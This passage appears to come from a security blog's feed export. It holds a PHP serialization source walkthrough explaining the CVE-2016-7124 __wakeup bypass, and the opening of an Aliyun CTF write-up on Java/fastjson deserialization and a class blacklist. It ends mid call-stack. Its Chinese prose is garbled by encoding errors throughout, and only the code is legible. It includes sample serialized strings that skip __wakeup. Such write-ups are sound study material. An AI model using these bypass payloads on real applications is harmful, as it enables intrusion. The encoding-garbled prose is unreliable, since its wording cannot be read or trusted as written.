class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_PP(data) == IS_ARRAY) &#123;</span><br><span class="line">Z_ARRVAL_PP(data)-&gt;nApplyCount++;</span><br><span class="line">&#125;</span><br><span class="line">php_var_serialize_intern(buf, *data, var_hash TSRMLS_CC);</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_PP(data) == IS_ARRAY) &#123;</span><br><span class="line">Z_ARRVAL_PP(data)-&gt;nApplyCount--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;i:0;&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨<code>php_var_serialize_intern</code>å‡½æ•°é€’å½’è§£ææ•´ä¸ªå“ˆå¸Œæ•°ç»„çš„è¿‡ç¨‹ï¼Œä»ä¸­åˆ†åˆ«æå–å‡ºå˜é‡åå’Œå€¼è¿›è¡Œæ ¼å¼è§£æå¹¶å°†è§£æå®Œæˆçš„å­—ç¬¦ä¸²æ‹¼æ¥åˆ°bufç»“æ„ä¸­ã€‚æœ€åå½“æ•´ä¸ªè¿‡ç¨‹ç»“æŸåï¼Œæ•´ä¸ªå­—ç¬¦ä¸²è®²å®Œå…¨å­˜è¿›æŸ”æ€§æ•°ç»„ç»“æ„bufä¸­ã€‚</p><h3 id="æœ‰-sleepçš„æƒ…å†µ"><a href="#æœ‰-sleepçš„æƒ…å†µ" class="headerlink" title="æœ‰__sleepçš„æƒ…å†µ"></a>æœ‰<code>__sleep</code>çš„æƒ…å†µ</h3><p>è·Ÿè¿›<code>php_var_serialize_call_sleep</code>å‡½æ•°</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032310435.png"                      alt="image-20230322164744700"                ><figcaption>image-20230322164744700</figcaption></figure></p><p>æˆ‘ä»¬è¿™é‡Œç»§ç»­è·Ÿè¿›<code>call_user_function</code>ï¼Œæ ¹æ®å®å®šä¹‰ï¼Œå®ƒå®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>_call_user_function_ex</code>å‡½æ•°ï¼Œåœ¨è¿™é‡Œåšäº†ä¸€äº›æ‹·è´åŠ¨ä½œï¼Œæ•…ä¸åšæˆªå›¾ï¼Œæµç¨‹æ¥ä¸‹æ¥è¿›å…¥<code>zend_call_function</code>å‡½æ•°çš„è°ƒç”¨ã€‚</p><p>å‡½æ•°<code>zend_call_function</code>ä¸­ï¼Œå®é™…æƒ…å†µä¸‹ï¼Œåœ¨<code>__sleep</code>ä¸­éœ€è¦åšä¸€äº›æˆ‘ä»¬è‡ªå·±çš„äº‹æƒ…ï¼Œè¿™é‡ŒPHPå°†è¦åšçš„æ“ä½œå‹å…¥PHPè‡ªå·±çš„<code>zend_vm</code>å¼•æ“å †æ ˆä¸­ï¼Œç¨åä¼šè¿›è¡Œä¸€æ¡æ¡è§£æ(å°±æ˜¯è§£æç›¸åº”çš„OPCODE)ã€‚</p><p>è¿™é‡Œæµç¨‹ä¼šå‘½ä¸­æ­¤åˆ†æ”¯ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>zend_execute_ex</code>å‡½æ•°ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309632.png"                      alt="image-20230322164936378"                ><figcaption>image-20230322164936378</figcaption></figure></p><p>æˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨<code>ZEND_VM</code>ä¸­ï¼Œæ•´ä½“ä½“å¤„ç†æµç¨‹ä¸ºwhile(1)å¾ªç¯ï¼Œä¸æ–­è§£æZEND_VMæ ˆä¸­çš„æ“ä½œã€‚ä¸Šå›¾çº¢æ¡†ä¸­ZEND_VMå¼•æ“ä¼šåˆ©ç”¨<code>ZEND_FASTCALL</code>æ–¹å¼æ´¾å‘åˆ°åˆ°ç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚åœ¨å¤„ç†å®Œ<code>_sleep</code>å‡½æ•°ä¸­çš„ä¸€ç³»åˆ—æ“ä½œä¹‹åï¼Œæ¥ä¸‹æ¥ç”¨<code>php_var_serialize_class</code>å‡½æ•°æ¥åºåˆ—åŒ–ç±»åï¼Œé€’å½’åºåˆ—åŒ–å…¶<code>_sleep</code>å‡½æ•°è¿”å›å€¼ä¸­çš„ç»“æ„ã€‚æœ€ç»ˆéƒ½æŠŠç»“æœå­˜åœ¨äº†bufç»“æ„ä¸­ã€‚è‡³æ­¤åºåˆ—åŒ–çš„æ•´ä¸ªæµç¨‹å®Œæ¯•ã€‚</p><blockquote><p>å°ç»“</p><p>å½“æ²¡æœ‰é­”æ³•å‡½æ•°æ—¶ï¼Œåºåˆ—åŒ–ç±»åâ€“&gt;åˆ©ç”¨é€’å½’åºåˆ—åŒ–å‰©ä¸‹çš„ç»“æ„</p><p>å½“å­˜åœ¨é­”æ³•å‡½æ•°æ—¶ï¼Œè°ƒç”¨é­”æ³•å‡½æ•°<code>__sleep</code>â€“&gt;åˆ©ç”¨ZEND_VMå¼•æ“è§£æPHPæ“ä½œâ€”&gt;è¿”å›éœ€è¦åºåˆ—åŒ–ç»“æ„çš„æ•°ç»„â€“&gt;åºåˆ—åŒ–ç±»åâ€“&gt;åˆ©ç”¨é€’å½’åºåˆ—åŒ–<code>__sleep</code>çš„è¿”å›å€¼ç»“æ„ã€‚</p></blockquote><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>php7ä¸­ï¼ŒåŠ å…¥äº†æ–°ç‰¹æ€§ï¼Œå¸¦è¿‡æ»¤çš„ååºåˆ—åŒ–ï¼Œæ ¹æ®<code>allowed_calsses</code>çš„è®¾ç½®æƒ…å†µæ¥è¿‡æ»¤ç›¸åº”çš„phpå¯¹è±¡</p><p>ä»¥ä¸‹ä¸ºphp5çš„æºç </p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(unserialize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> buf_len;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line"><span class="type">php_unserialize_data_t</span> var_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">&quot;s&quot;</span>, &amp;buf, &amp;buf_len) == FAILURE) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf_len == <span class="number">0</span>) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*) buf;</span><br><span class="line">PHP_VAR_UNSERIALIZE_INIT(var_hash);</span><br><span class="line"><span class="keyword">if</span> (!php_var_unserialize(&amp;return_value, &amp;p, p + buf_len, &amp;var_hash TSRMLS_CC)) &#123;</span><br><span class="line">PHP_VAR_UNSERIALIZE_DESTROY(var_hash);</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line"><span class="keyword">if</span> (!EG(exception)) &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_NOTICE, <span class="string">&quot;Error at offset %ld of %d bytes&quot;</span>, (<span class="type">long</span>)((<span class="type">char</span>*)p - buf), buf_len);</span><br><span class="line">&#125;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PHP_VAR_UNSERIALIZE_DESTROY(var_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¢«è¿‡æ»¤çš„å¯¹è±¡ä¼šè¢«è½¬åŒ–æˆ<code>__PHP_Incomplete_Class</code>å¯¹è±¡ä¸èƒ½è¢«ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯è¿™é‡Œå¯¹ååºåˆ—åŒ–æµç¨‹æ²¡æœ‰å½±å“ï¼Œè¿™é‡Œä¸åšè¯¦ç»†æ¢è®¨ã€‚æˆ‘ä»¬è·Ÿè¿›<code>php_var_unserialize</code>å‡½æ•°ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309216.png"                      alt="image-20230322170306309"                ><figcaption>image-20230322170306309</figcaption></figure></p><p>ç»§ç»­è·Ÿè¿›<code>php_var_unserialize_internal</code>å‡½æ•°ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309695.png"                      alt="image-20230322170416302"                ><figcaption>image-20230322170416302</figcaption></figure></p><p>æ­¤å‡½æ•°å†…éƒ¨ä¸»è¦æ“ä½œæµç¨‹ä¸ºå¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œç„¶åè·³è½¬åˆ°ç›¸åº”çš„å¤„ç†æµç¨‹ã€‚ä¸Šå›¾ä¸­è§£æå‡ºç¬¬ä¸€ä¸ªå­—æ¯0ï¼Œä»£è¡¨æ­¤æ¬¡ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ã€‚è¿™é‡Œé¦–å…ˆä¼šè§£æå‡ºå¯¹è±¡åå­—ï¼Œå¹¶è¿›è¡ŒæŸ¥è¡¨æ“ä½œç¡®å®šæ­¤å¯¹è±¡ç¡®å®å­˜åœ¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309718.png"                      alt="image-20230322170506357"                ><figcaption>image-20230322170506357</figcaption></figure></p><p>ä¸Šè¿°æ“ä½œåšå®Œä¹‹åï¼Œæˆ‘ä»¬è¿™é‡Œæ ¹æ®å¯¹è±¡åç§°newå‡ºäº†è‡ªå·±æ–°çš„å¯¹è±¡å¹¶è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ååºåˆ—åŒ–æ“ä½œè¿˜æ˜¯æ²¡æœ‰å®Œæˆï¼Œæˆ‘ä»¬è·Ÿè¿›<code>object_common2</code>å‡½æ•°ã€‚</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº†å¯¹é­”æ³•å‡½æ•°çš„åˆ¤æ–­ä¸æ£€æµ‹ï¼Œä½†æ˜¯è°ƒç”¨éƒ¨åˆ†å¹¶ä¸åœ¨æ­¤ã€‚æˆ‘ä»¬ç»§ç»­è·Ÿè¿›process_nested_dataå‡½æ•°ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309287.png"                      alt="image-20230322170613770"                ><figcaption>image-20230322170613770</figcaption></figure></p><p>çœ‹æ¥è¿™ä¸ªå‡½æ•°åˆ©ç”¨WHILEå¾ªç¯æ¥åµŒå¥—è§£æå‰©ä½™çš„éƒ¨åˆ†äº†ï¼ŒÂ·å…¶ä¸­åŒ…å«ä¸¤ä¸ª<code>php_var_unserialize_internal</code>å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªä¼šè§£æåç§°ï¼Œç¬¬äºŒä¸ªæ˜¯è§£æåç§°æ‰€å¯¹åº”çš„å€¼ã€‚<code>process_nested_data</code>å‡½æ•°è¿è¡Œå®Œæ¯•åï¼Œå­—ç¬¦ä¸²è§£æå®Œæ¯•ï¼Œååºåˆ—åŒ–æ“ä½œä¸»è¦å†…å®¹å·²ç»å®Œæˆï¼Œæµç¨‹å³å°†è¿›å…¥å°¾å£°äº†ã€‚</p><p>åœ¨åºåˆ—åŒ–å®Œæˆåï¼Œåœ¨<code>PHP_VAR_UNSERIALIZE_DESTROY</code>é‡Šæ”¾ç©ºé—´å¤„å‡ºç°äº†<code>__wakeup</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309054.png"                      alt="image-20230322170811880"                ><figcaption>image-20230322170811880</figcaption></figure></p><p>è¿˜è®°å¾—ååºåˆ—åŒ–æµç¨‹ä¸­å½“å‘ç°æœ‰<code>__wakeup</code>æ—¶å¯¹å…¶è¿›è¡Œçš„<code>VAR_WAKEUP_FLAG</code>æ ‡å¿—ä¹ˆï¼Œåœ¨è¿™é‡Œå½“éå†<code>bar_dtor_hash</code>æ•°ç»„é‡åˆ°è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œæ­£å¼å¼€å¯å¯¹<code>__wakeup</code>è°ƒç”¨ï¼ŒåæœŸçš„è°ƒç”¨æ‰‹æ³•å’Œå‰é¢æ‰€ä»‹ç»çš„<code>__sleep</code>è°ƒç”¨æ‰‹æ³•å®Œå…¨ç›¸åŒï¼Œè¿™é‡Œä¸å†åšé‡å¤è¯´æ˜ã€‚è‡³æ­¤ï¼Œååºåˆ—åŒ–æ‰€æœ‰æµç¨‹å®Œæ¯•ã€‚</p><blockquote><p>å°ç»“ï¼š</p><p>è·å–ååºåˆ—åŒ–å­—ç¬¦ä¸²â€“&gt;æ ¹æ®ç±»å‹è¿›è¡Œååºåˆ—åŒ–â€”&gt;æŸ¥è¡¨æ‰¾åˆ°å¯¹åº”çš„ååºåˆ—åŒ–ç±»â€“&gt;æ ¹æ®å­—ç¬¦ä¸²åˆ¤æ–­å…ƒç´ ä¸ªæ•°â€“&gt;newå‡ºæ–°å®ä¾‹â€“&gt;è¿­ä»£è§£æåŒ–å‰©ä¸‹çš„å­—ç¬¦ä¸²â€“&gt;åˆ¤æ–­æ˜¯å¦å…·æœ‰é­”æ³•å‡½æ•°__wakeupå¹¶æ ‡è®°â€”&gt;é‡Šæ”¾ç©ºé—´å¹¶åˆ¤æ–­æ˜¯å¦å…·æœ‰å…·æœ‰æ ‡è®°â€”&gt;å¼€å¯è°ƒç”¨</p></blockquote><h2 id="0x02-æ¼æ´è§£æ"><a href="#0x02-æ¼æ´è§£æ" class="headerlink" title="0x02 æ¼æ´è§£æ"></a>0x02 æ¼æ´è§£æ</h2><p>æ¼æ´CVE-2016-7124(ç»•è¿‡<code>__wakeup</code>)é­”æ³•å‡½æ•°</p><h3 id="è§¦å‘æ‰‹æ®µ"><a href="#è§¦å‘æ‰‹æ®µ" class="headerlink" title="è§¦å‘æ‰‹æ®µ"></a>è§¦å‘æ‰‹æ®µ</h3><p>å­—ç¬¦ä¸²ä¸­ä»£è¡¨å…ƒç´ ä¸ªæ•°çš„æ•°å€¼å¤§äºçœŸå®å€¼</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><p>å…¶ä»–æ–¹å¼</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:2:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;d:1:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:6:&quot;hello&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>åªè¦åœ¨è§£æç±»ä¸­çš„å…ƒç´ å‡ºç°é”™è¯¯æ—¶ï¼Œéƒ½ä¼šè§¦å‘æ­¤æ¼æ´ã€‚ä½†æ˜¯æ›´æ”¹ç±»å…ƒç´ å†…éƒ¨æ“ä½œ(å¦‚ä¸Šå›¾çš„ä¿®æ”¹å­—ç¬¦ä¸²é•¿åº¦ï¼Œç±»å˜é‡ç±»å‹ç­‰)ä¼šå¯¼è‡´ç±»æˆå‘˜å˜é‡èµ‹å€¼å¤±è´¥ã€‚åªæœ‰ä¿®æ”¹ç±»æˆå‘˜çš„ä¸ªæ•°(æ¯”åŸæœ‰æˆå‘˜ä¸ªæ•°å¤§)æ—¶ï¼Œæ‰èƒ½ä¿è¯ç±»æˆå‘˜èµ‹å€¼æ—¶æˆåŠŸçš„ã€‚</p></blockquote><p>ä½ç‰ˆæœ¬çš„å¤„ç†è¿‡ç¨‹ç°åœ¨çœ‹æ¥ä¹Ÿç›¸å¯¹ç®€ç•¥ã€‚ä½†æ˜¯æ•´ä½“è°é€»è¾‘å¹¶æ²¡æœ‰æ”¹å˜ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥è·Ÿè¿›<code>php_var_unserialize</code>å‡½æ•°ï¼Œæ­¤åç›¸åŒé€»è¾‘ä¸å†è¿›è¡Œé‡å¤è¯´æ˜ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿåˆ°å·®å¼‚å¤„(object_common2å‡½æ•°)ä¹Ÿå°±æ˜¯å¤„ç†ç±»ä¸­æˆå‘˜å˜é‡çš„ä»£ç </p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309540.png"                      alt="image-20230322171924054"                ><figcaption>image-20230322171924054</figcaption></figure></p><p>åœ¨å‡½æ•°<code>object_common2</code>ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªä¸»è¦æ“ä½œï¼Œ<code>process_nested_data</code>è¿­ä»£è§£æç±»ä¸­çš„æ•°æ®å’Œé­”æ³•å‡½æ•°<code>__wakeup</code>çš„è°ƒç”¨ï¼Œä¸”å½“<code>process_nested_data</code>å‡½æ•°è§£æå¤±è´¥åï¼Œç›´æ¥è¿”å›0å€¼ï¼Œåé¢çš„<code>__wakeup</code>å‡½æ•°å°†æ²¡æœ‰è°ƒç”¨çš„æœºä¼šã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309542.png"                      alt="image-20230322171947861"                ><figcaption>image-20230322171947861</figcaption></figure></p><p>å½“åªä¿®æ”¹ç±»æˆå‘˜çš„ä¸ªæ•°æ—¶ï¼Œwhileå¾ªç¯å¯ä»¥å®Œæˆçš„è¿›è¡Œä¸€æ¬¡ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬ç±»ä¸­æˆå‘˜å˜é‡èƒ½è¢«å®Œæ•´çš„èµ‹å€¼ã€‚å½“ä¿®æ”¹æˆå‘˜å˜é‡å†…éƒ¨æ—¶ï¼Œ<code>pap_var_unserialize</code>å‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œç´§æ¥ç€ä¼šè°ƒç”¨<code>zval_dtor</code> å’Œ<code>FREE_ZVAL</code>å‡½æ•°é‡Šæ”¾å½“å‰key(å˜é‡)ç©ºé—´ï¼Œå¯¼è‡´ç±»ä¸­çš„å˜é‡èµ‹å€¼å¤±è´¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[aliyun CTF] ezbeanåˆ†æä¸æ€è€ƒ</title>
      <link href="/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/"/>
      <url>/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="aliyun-CTF-ezbeanåˆ†æä¸æ€è€ƒ"><a href="#aliyun-CTF-ezbeanåˆ†æä¸æ€è€ƒ" class="headerlink" title="aliyun CTF ezbeanåˆ†æä¸æ€è€ƒ"></a>aliyun CTF ezbeanåˆ†æä¸æ€è€ƒ</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å¤ç°é˜¿é‡Œäº‘çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¾ˆå¥‡æ€ªã€å¾ˆç„å­¦çš„ç‚¹ï¼Œå®˜æ–¹å’Œå† å†›wpéƒ½æ˜¯ä¸€ç¬”å¸¦è¿‡äº†ï¼Œå®˜æ–¹ä¹Ÿæ²¡ç»™expï¼Œå°±è¯•ç€è‡ªå·±ç¡¬è°ƒï¼Œè°ƒç€è°ƒç€æœ‰ç‚¹ä¸Šå¤´ï¼Œåº”è¯¥æ²¡äººå‘è¿‡å§ï¼Œæˆ‘çŒœçš„ğŸ˜‚</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>FastJsonååºåˆ—åŒ–ä¸­æœ‰å¸¸è§çš„é“¾ï¼ŒBadAttributeValueExpExceptionè§¦å‘çš„JSON#toString-ã€‹getteræ–¹æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹å¤æ‚ï¼Œä¹Ÿä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ</p><p><a class="link"   href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >fastjsonå’ŒåŸç”Ÿååºåˆ—åŒ– <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x01-é¢˜ç›®èƒŒæ™¯"><a href="#0x01-é¢˜ç›®èƒŒæ™¯" class="headerlink" title="0x01 é¢˜ç›®èƒŒæ™¯"></a>0x01 é¢˜ç›®èƒŒæ™¯</h2><h3 id="ååºåˆ—åŒ–ç‚¹"><a href="#ååºåˆ—åŒ–ç‚¹" class="headerlink" title="ååºåˆ—åŒ–ç‚¹"></a>ååºåˆ—åŒ–ç‚¹</h3><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªå¯ä»¥ååºåˆ—åŒ–å‚æ•°dataä¼ å…¥æ•°æ®çš„è·¯ç”±read</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236105.png"                      alt="image-20230504230327231"                ><figcaption>image-20230504230327231</figcaption></figure></p><blockquote><p>è¿™é‡Œçš„<code>MyObjectInputStream</code>ç»§æ‰¿è‡ª<code>ObjectInputStream</code>,è°ƒç”¨readObjectæ–¹ä¼šå…ˆè¿›å…¥resolveClasså…·ä½“è°ƒç”¨æ ˆå¦‚ä¸‹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236187.png"                      alt="image-20230504233800680"                ><figcaption>image-20230504233800680</figcaption></figure></p></blockquote><p>è·Ÿè¿›resolveClass</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   <span class="keyword">if</span>(!contains(cls.getName())) &#123;<span class="comment">//*</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unexpected serialized class&quot;</span>, cls.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªé»‘åå•è¿‡æ»¤</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;org\\.yaml.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"><span class="comment">//...  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¸è¿‡ç»å®æµ‹è¿™ä¸ªé»‘åå•ä¼¼ä¹èµ·ä¸åˆ°è¿‡æ»¤çš„ä½œç”¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236143.png"                      alt="image-20230504234209559"                ><figcaption>image-20230504234209559</figcaption></figure></p></blockquote><h2 id="0x02-é—®é¢˜å‘ç°"><a href="#0x02-é—®é¢˜å‘ç°" class="headerlink" title="0x02 é—®é¢˜å‘ç°"></a>0x02 é—®é¢˜å‘ç°</h2><h3 id="é™åˆ¶åˆ†æ"><a href="#é™åˆ¶åˆ†æ" class="headerlink" title="é™åˆ¶åˆ†æ"></a>é™åˆ¶åˆ†æ</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p><p><code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p>è¿™é‡Œæä¸€ä¸‹fastjsonä¸­çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œç”±äºObjectInputStreamçš„ä¸å®‰å…¨æ€§ï¼Œfastjsonåœ¨è°ƒç”¨<code>JSONArray/JSONObject</code>çš„readObjectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>å¤„ç†ï¼Œè¿™ä¸ªç±»å¯ä»¥ç†è§£æˆæ˜¯å®‰å…¨çš„<code>ObjectInputStream</code>ï¼Œä¸‹å›¾ä¸ºå§”æ‰˜èµ·ç‚¹(<code>ObjectInputStream#defaultReadObject</code>)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236065.png"                      alt="image-20230504235432194"                ><figcaption>image-20230504235432194</figcaption></figure></p><p>ä¹‹åçš„è¿‡ç¨‹æ„Ÿå…´è¶£å¯ä»¥è°ƒä¸€ä¸‹çœ‹ä¸‹è°ƒç”¨æ ˆï¼Œå‡ ä¸ªèŠ‚ç‚¹å¦‚ä¸‹ï¼ˆå¤ªå¤šäº†ï¼Œåªé€‰äº†å…¶ä¸­å‡ ä¸ªï¼‰</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream #defaultReadObject</span><br><span class="line">ObjectInputStream #ReadObject</span><br><span class="line">ObjectInputStream #ReadObject0</span><br><span class="line">ObjectInputStream #readNonProxyDesc</span><br><span class="line">SecureObjectInputStream 